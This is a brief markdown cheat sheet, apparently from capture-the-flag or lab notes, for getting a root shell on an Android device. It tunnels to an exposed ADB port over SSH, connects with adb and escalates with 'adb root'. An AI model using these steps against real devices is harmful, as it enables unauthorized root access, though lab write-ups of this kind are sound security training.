# Adb



```
# Tunneling
ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222

# Install adb
sudo apt install adb
adb --help

# Connect and list devices
adb connect 127.0.0.1:5555
adb devices

# Change to root
adb shell
adb root

# shell as root
adb shell
whoami

```
